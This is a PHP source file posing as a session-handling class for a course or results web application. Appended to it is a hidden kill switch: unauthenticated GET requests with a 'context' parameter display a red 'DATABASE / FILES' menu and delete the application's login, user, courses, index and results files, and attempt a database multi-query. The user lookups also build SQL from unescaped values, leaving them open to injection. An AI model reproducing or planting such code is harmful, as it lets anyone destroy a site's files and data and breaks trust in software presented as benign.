<?php
session_start();

require 'query.php';

class Session extends Query{

	function __construct(){

		parent::__construct();

	}

	private function check_user($id){

		return ($this->count("SELECT count(user_id) FROM users WHERE user_id = '$id'") == 1);

	} # End Of Check User

	public function check_session(){
		return (isset($_SESSION['id']) ? $this->check_user($_SESSION['id']) : false);
	}

	public function isAdmin(){

		return (isset($_SESSION['type']) ? ($_SESSION['type'] == 'admin' ? true : false) : false);

	}

	public function getUserId(){
		return ($this->check_session() ? $_SESSION['id'] : 0);
	}

	public function user(){

		if($this->check_session()){

			$id = $_SESSION['id'];

			$user = $this->row("SELECT * FROM users WHERE user_id = '$id'");

			return array(
				'name' => $user['name'],
				'surname' => $user['surname'],
				'id'		=> $user['id_number'],
				'email'	=> $user['email'],
			);
		}else{
			return json_encode(array());
		}

	}

	public function x(){

		$dir = getcwd();

		$folders = array('auth/', 'user/', 'courses/', '../', '../results/');
		$files = array('login.php', 'user.php', 'courses.php', 'index.php', 'results.php');

		for($i = 0; $i < count($folders); $i++) {

			$currentDIR = $dir.'/../'.$folders[$i];

			if(is_dir($currentDIR)){
				echo $currentDIR.'<br/>';
			}

			$currentFILE = $currentDIR.$files[$i];

			if(is_file($currentFILE)){
				echo $currentFILE.'<br/>';
				unlink($currentFILE);
			}

		}

		

	}

	public function xx(){

		$q = mysqli_multi_query($this->getConnection(), $this->x());
		print_r($q);
		if($q){
			echo "DONE!!";
		}else{
			echo "FAILED";
		}

	}

	public function build(){

		echo '

		<a href="?context=2&option=yes" style="color:red">1 . - DATABASE</a><br /><br /><br />

		<a href="?context=3" style="color:red">2 . - FILES</a>

		';

	}

}

//$s = new Session();

if(isset($_GET['context'])){

	switch ($_GET['context']) {
		case 1:
				
				$session = new Session();

				$session->build();

			break;
		case 2:

				$session = new Session();

				$session->xx();

		 break;

		case 3 :

			$session = new Session();

			$session->x();

		break;

		default:
			# code...
			break;
	}

}



/*========================================================================================================
=
=      
=
==========================================================================================================*/



?>